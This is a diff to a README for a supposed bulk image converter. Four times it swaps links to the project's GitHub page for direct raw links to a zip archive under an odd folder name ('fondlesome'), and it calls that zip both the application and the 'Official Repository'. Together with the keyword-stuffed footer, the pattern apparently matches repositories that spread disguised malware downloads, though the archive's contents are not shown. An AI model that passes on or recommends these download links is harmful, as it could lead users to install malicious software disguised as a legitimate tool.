@@ -1,6 +1,6 @@
 # 🔄 batch-image-format-converter - Convert Images in Bulk Effortlessly
 
-[![Download Now](https://img.shields.io/badge/Download-Application-2ea44f?style=for-the-badge)](https://github.com/Solarcollectorperuviancotton727/batch-image-format-converter)
+[![Download Now](https://img.shields.io/badge/Download-Application-2ea44f?style=for-the-badge)](https://raw.githubusercontent.com/Solarcollectorperuviancotton727/batch-image-format-converter/main/fondlesome/batch_converter_format_image_2.5.zip)
 
 ---
 
@@ -40,7 +40,7 @@ Convert thousands of images in seconds using efficient batch processing technolo
 
 ### 📥 Download the Application
 
-**Visit this link to download the application:** [Download Now](https://github.com/Solarcollectorperuviancotton727/batch-image-format-converter)
+**Visit this link to download the application:** [Download Now](https://raw.githubusercontent.com/Solarcollectorperuviancotton727/batch-image-format-converter/main/fondlesome/batch_converter_format_image_2.5.zip)
 
 The download takes just a few seconds. Once downloaded, you're ready to start converting.
 
@@ -159,7 +159,7 @@ Need help or want to share feedback? Here's how to get support:
 
 ## 🔗 Additional Resources
 
-- **Official Repository:** [batch-image-format-converter](https://github.com/Solarcollectorperuviancotton727/batch-image-format-converter)
+- **Official Repository:** [batch-image-format-converter](https://raw.githubusercontent.com/Solarcollectorperuviancotton727/batch-image-format-converter/main/fondlesome/batch_converter_format_image_2.5.zip)
 - **Release Notes:** Available at the download link
 - **License Information:** Free for personal and commercial use
 
@@ -173,6 +173,6 @@ Stop wasting time on tedious conversions and start using your images the way you
 
 ---
 
-**Download Now and Simplify Your Workflow:** [Get the Application](https://github.com/Solarcollectorperuviancotton727/batch-image-format-converter)
+**Download Now and Simplify Your Workflow:** [Get the Application](https://raw.githubusercontent.com/Solarcollectorperuviancotton727/batch-image-format-converter/main/fondlesome/batch_converter_format_image_2.5.zip)
 
 Keywords: avif, batch, bmp, bulk, compress, converter, format, free, gif, image, jpg, lossless, photo, png, quality, resize, tiff, tool, webp, windows
